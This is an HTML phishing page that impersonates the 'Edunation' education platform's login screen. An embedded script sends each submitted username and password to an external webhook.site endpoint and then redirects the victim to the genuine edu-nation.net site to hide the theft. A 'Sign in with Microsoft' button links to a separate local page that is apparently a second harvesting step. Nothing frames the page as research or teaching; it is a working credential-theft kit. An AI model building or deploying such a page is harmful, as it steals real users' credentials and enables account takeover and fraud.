<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Edunation | Login</title>
    <style>
        body { margin: 0; background-color: #0088cc; background-image: url('https://www.transparenttextures.com/patterns/cubes.png'); display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Arial, sans-serif; }
        .login-card { background: white; padding: 40px; border-radius: 12px; width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
        .logo { font-size: 52px; font-weight: bold; color: #00adef; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; border: 1px solid #e0e0e0; border-radius: 25px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-login { background-color: #82c341; color: white; border: none; padding: 12px; width: 100%; border-radius: 25px; font-weight: bold; cursor: pointer; }
        .social-btn { border: 1px solid #e0e0e0; padding: 10px; border-radius: 25px; font-size: 13px; color: #555; margin-top: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer; text-decoration: none; }
        .social-btn img { width: 18px; margin-right: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">edunation</div>
        <form id="edu-trap">
            <input type="text" id="u" placeholder="Username" required>
            <input type="password" id="p" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <div style="color:#ccc; margin:20px 0;">— OR —</div>
        <a href="microsoft.html" class="social-btn">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
            Sign in with Microsoft
        </a>
    </div>
    <script>
        document.getElementById('edu-trap').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch("https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({ platform: "Edunation", user: document.getElementById('u').value, pass: document.getElementById('p').value })
            }).then(() => { window.location.href = "https://www.edu-nation.net/"; });
        });
    </script>
</body>
</html>
